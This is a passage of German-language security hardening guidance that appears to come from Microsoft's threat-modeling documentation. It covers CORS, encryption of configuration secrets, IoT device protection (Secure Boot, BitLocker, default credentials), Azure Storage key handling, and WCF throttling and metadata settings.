Stellen Sie unbedingt sicher, dass die Liste mit Ursprüngen im EnableCors-Attribut auf eine begrenzte Anzahl vertrauenswürdiger Ursprünge festgelegt ist. Ist dieser Aspekt nicht ordnungsgemäß konfiguriert (also der Wert beispielsweise auf „*“ festgelegt), können schädliche Websites ursprungsübergreifende Anforderungen ohne jegliche Einschränkungen an die API richten, wodurch die API für CSRF-Angriffe anfällig wird. 

### <a name="example"></a>Beispiel
Wenn Sie CORS für einen Controller oder eine Aktion deaktivieren möchten, verwenden Sie das DisableCors-Attribut. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Verschlüsseln Sie Abschnitte der Web-API-Konfigurationsdateien, die sensible Daten enthalten.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Web-API | 
| **SDL-Phase**               | Bereitstellung |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI](https://msdn.microsoft.com/library/ff647398.aspx) (Gewusst wie: Verschlüsseln von Konfigurationsabschnitten in ASP.NET 2.0 mithilfe von DPAPI), [Angeben eines geschützten Konfigurationsanbieters](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Verwenden von Azure Key Vault zum Schützen von Anwendungsgeheimnissen](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Schritte** | In Konfigurationsdateien wie „web.config“ und „appsettings.json“ werden häufig sensible Informationen wie Benutzernamen, Kennwörter, Datenbankverbindungszeichenfolgen und Verschlüsselungsschlüssel gespeichert. Wenn Sie diese Informationen nicht schützen, können Angreifer oder böswillige Benutzer an sensible Informationen wie Kontobenutzernamen und Kennwörter, Datenbanknamen und Servernamen gelangen. Verschlüsseln Sie daher die sensiblen Abschnitte von Konfigurationsdateien basierend auf dem Bereitstellungstyp (Azure/lokal) mithilfe von DPAPI oder mithilfe von Diensten wie Azure Key Vault. |

## <a id="admin-strong"></a>Stellen Sie sicher, dass alle Administratoroberflächen durch sichere Anmeldeinformationen geschützt sind.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | IoT-Gerät | 
| **SDL-Phase**               | Bereitstellung |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | Administratoroberflächen, die das Gerät oder das zwischengeschaltete Gateway verfügbar macht, müssen mit sicheren Anmeldeinformationen geschützt werden. Weitere verfügbar gemachte Schnittstellen wie WLAN, SSH, Dateifreigaben und FTP müssen mit sicheren Anmeldeinformationen geschützt werden. Verwenden Sie keine unsicheren Standardkennwörter. |

## <a id="unknown-exe"></a>Stellen Sie sicher, dass auf Geräten kein unbekannter Code ausgeführt werden kann.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | IoT-Gerät | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [Enabling Secure Boot and BitLocker Device Encryption on Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) (Aktivieren des sicheren Starts und der BitLocker-Geräteverschlüsselung unter Windows 10 IoT Core) |
| **Schritte** | Der sichere UEFI-Start sorgt mittels Einschränkung des Systems dafür, dass nur Binärdateien ausgeführt werden können, die von einer angegebenen Stelle signiert wurden. Dieses Feature verhindert die Ausführung von unbekanntem Code auf der Plattform und damit eine potenzielle Beeinträchtigung ihres Sicherheitsstatus. Aktivieren Sie den sicheren UEFI-Start, und schränken Sie die Liste mit den vertrauenswürdigen Zertifizierungsstellen ein, die Code signieren können. Lassen Sie sämtlichen Code, der auf dem Gerät bereitgestellt wird, von einer der vertrauenswürdigen Zertifizierungsstellen signieren. |

## <a id="partition-iot"></a>Verschlüsseln Sie die Betriebssystempartition und andere Partitionen des IoT-Geräts mit BitLocker.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | IoT-Gerät | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | Windows 10 IoT Core implementiert eine vereinfachte Version der BitLocker-Geräteverschlüsselung, die stark davon abhängig ist, dass die Plattform über ein TPM verfügt – einschließlich des erforderlichen preOS-Protokolls in UEFI zur Durchführung der erforderlichen Messungen. Mit diesen preOS-Messungen wird sichergestellt, dass das Betriebssystem später eindeutig nachvollziehen kann, wie es gestartet wurde. Verschlüsseln Sie Betriebssystempartitionen und andere Partitionen, auf denen sensible Daten gespeichert sind, mit BitLocker. |

## <a id="min-enable"></a>Stellen Sie sicher, dass auf Geräten nur unbedingt erforderliche Dienste/Features aktiviert sind.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | IoT-Gerät | 
| **SDL-Phase**               | Bereitstellung |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | Lassen Sie alle Features oder Dienste des Betriebssystems, die nicht für den ordnungsgemäßen Betrieb der Lösung benötigt werden, deaktiviert, bzw. deaktivieren Sie sie. Falls für das Gerät also beispielsweise keine Benutzeroberfläche bereitgestellt werden muss, installieren Sie Windows IoT Core im monitorlosen Modus. |

## <a id="field-bit-locker"></a>Verschlüsseln Sie die Betriebssystempartition und andere Partitionen des zwischengeschalteten IoT-Gateways mit BitLocker.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Zwischengeschaltetes IoT-Gateway | 
| **SDL-Phase**               | Bereitstellung |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | Windows 10 IoT Core implementiert eine vereinfachte Version der BitLocker-Geräteverschlüsselung, die stark davon abhängig ist, dass die Plattform über ein TPM verfügt – einschließlich des erforderlichen preOS-Protokolls in UEFI zur Durchführung der erforderlichen Messungen. Mit diesen preOS-Messungen wird sichergestellt, dass das Betriebssystem später eindeutig nachvollziehen kann, wie es gestartet wurde. Verschlüsseln Sie Betriebssystempartitionen und andere Partitionen, auf denen sensible Daten gespeichert sind, mit BitLocker. |

## <a id="default-change"></a>Stellen Sie sicher, dass die Standardanmeldeinformationen des zwischengeschalteten Gateways bei der Installation geändert werden.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Zwischengeschaltetes IoT-Gateway | 
| **SDL-Phase**               | Bereitstellung |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | Stellen Sie sicher, dass die Standardanmeldeinformationen des zwischengeschalteten Gateways bei der Installation geändert werden. |

## <a id="cloud-firmware"></a>Stellen Sie sicher, dass das Cloudgateway einen Prozess implementiert, der die Firmware verbundener Geräte auf dem neuesten Stand hält.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | IoT-Cloudgateway | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | Wahl des Gateways: Azure IoT Hub |
| **Referenzen**              | [Übersicht über die Geräteverwaltung mit IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [How to update Device Firmware](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) (Aktualisieren der Gerätefirmware) |
| **Schritte** | LWM2M ist ein Protokoll der Open Mobile Alliance zur Verwaltung von IoT-Geräten. Die Azure IoT-Geräteverwaltung ermöglicht die Interaktion mit physischen Geräten über Geräteaufträge. Stellen Sie sicher, dass das Cloudgateway einen Prozess implementiert, der das Gerät und andere Konfigurationsdaten mithilfe der Geräteverwaltung von Azure IoT Hub regelmäßig auf den neuesten Stand bringt. |

## <a id="controls-policies"></a>Stellen Sie sicher, dass für Geräte organisationsrichtlinienkonforme Endpunktsicherheitskontrollen konfiguriert sind.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Computer-Vertrauensstellungsgrenze | 
| **SDL-Phase**               | Bereitstellung |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | Stellen Sie sicher, dass für Geräte organisationsrichtlinienkonforme Endpunktsicherheitskontrollen konfiguriert sind. Beispiele wären etwa BitLocker für die Verschlüsselung auf Datenträgerebene, Virenschutz mit aktualisierten Signaturen, eine hostbasierte Firewall, Betriebssystemupgrades und Gruppenrichtlinien. |

## <a id="secure-keys"></a>Gewährleisten Sie die sichere Verwaltung von Azure-Speicherzugriffsschlüsseln.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Azure Storage | 
| **SDL-Phase**               | Bereitstellung |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [Azure Storage-Sicherheitsleitfaden – Verwalten Ihres Speicherkontoschlüssels](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Schritte** | <p>Schlüsselspeicher: Es wird empfohlen, die Azure-Speicherzugriffsschlüssel als Geheimnis in Azure Key Vault zu speichern und von den Anwendungen aus dem Schlüsseltresor abrufen zu lassen. Dies empfiehlt sich aus folgenden Gründen:</p><ul><li>Der Speicherschlüssel liegt zu keinem Zeitpunkt als hartcodierter Speicherschlüssel in einer Konfigurationsdatei der Anwendung vor, sodass ohne ausdrückliche Berechtigung niemand Zugriff auf die Schlüssel erlangen kann.</li><li>Der Zugriff auf die Schlüssel kann über Azure Active Directory gesteuert werden. Das bedeutet, ein Kontoinhaber kann einigen wenigen Anwendungen, die Schlüssel aus Azure Key Vault abrufen müssen, Zugriff gewähren. Andere Anwendungen können nur auf die Schlüssel zugreifen, wenn ihnen dies explizit gestattet wird.</li><li>Erneute Schlüsselgenerierung: Aus Sicherheitsgründen empfiehlt es sich, ein Verfahren für die erneute Generierung von Speicherzugriffsschlüsseln einzurichten. Details zu den Gründen und zur Vorgehensweise für die Planung der erneuten Schlüsselgenerierung finden Sie im Referenzartikel des Azure Storage-Sicherheitsleitfadens.</li></ul>|

## <a id="cors-storage"></a>Stellen Sie sicher, dass nur vertrauenswürdige Ursprünge zulässig sind, wenn CORS für Azure Storage aktiviert ist.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Azure Storage | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [Cross-Origin Resource Sharing (CORS) Support for the Azure Storage Services](https://msdn.microsoft.com/library/azure/dn535601.aspx) (Unterstützung von CORS (Cross-Origin Resource Sharing; ursprungsübergreifende Freigabe) für die Azure Storage-Dienste) |
| **Schritte** | Mit Azure Storage können Sie CORS aktivieren – Ressourcenfreigabe zwischen verschiedenen Ursprüngen. Für jedes Speicherkonto können Sie Domänen angeben, die auf die Ressourcen in diesem Speicherkonto zugreifen können. CORS ist standardmäßig für alle Dienste deaktiviert. Sie können CORS mithilfe der REST-API oder der Speicherclientbibliothek für den Aufruf einer der Methoden zum Festlegen von Dienstrichtlinien aktivieren. |

## <a id="throttling"></a>Aktivieren Sie das Diensteinschränkungsfeature von WCF.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | WCF | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | .NET Framework 3 |
| **Attribute**              | N/V  |
| **Referenzen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Schritte** | <p>Wird die Verwendung der Systemressourcen nicht begrenzt, gehen die Ressourcen unter Umständen zur Neige, was letztendlich zu einem Denial-of-Service-Zustand führt.</p><ul><li>**ERLÄUTERUNG:** Windows Communication Foundation (WCF) ermöglicht die Drosselung von Dienstanforderungen. Wenn zu viele Clientanforderungen zugelassen werden, ist das System möglicherweise zu stark ausgelastet, und die Ressourcen gehen zur Neige. Wird dagegen nur eine geringe Anzahl von Dienstanforderungen zugelassen, können berechtigte Benutzer den Dienst unter Umständen nicht verwenden. Jeder Dienst muss einzeln optimiert und so konfiguriert werden, dass eine angemessene Ressourcenmenge zugelassen wird.</li><li>**EMPFEHLUNGEN:** Aktivieren Sie das Diensteinschränkungsfeature von WCF, und legen Sie geeignete Grenzwerte für Ihre Anwendung fest.</li></ul>|

### <a name="example"></a>Beispiel
Das folgende Beispiel zeigt eine Konfiguration mit aktivierter Drosselung:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Offenlegung von WCF-Informationen durch Metadaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | WCF | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | .NET Framework 3 |
| **Attribute**              | N/V  |
| **Referenzen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Schritte** | Anhand von Metadaten kann ein Angreifer Informationen zum System erlangen und einen Angriff planen. WCF-Dienste können so konfiguriert werden, dass sie Metadaten verfügbar machen. Metadaten liefern eine ausführliche Dienstbeschreibung und dürfen in Produktionsumgebungen nicht weitergegeben werden. Die Eigenschaften `HttpGetEnabled` / `HttpsGetEnabled` der ServiceMetaData-Klasse definieren, ob ein Dienst Metadaten verfügbar macht. | 

### <a name="example"></a>Beispiel
Der folgende Code weist WCF an, die Metadaten eines Diensts weiterzugeben:
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Dienstmetadaten dürfen in Produktionsumgebungen nicht weitergegeben werden. Legen Sie die Eigenschaften „HttpGetEnabled“ und „HttpsGetEnabled“ der ServiceMetaData-Klasse auf „false“ fest. 

### <a name="example"></a>Beispiel
Der folgende Code weist WCF an, die Metadaten eines Diensts nicht weiterzugeben: 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
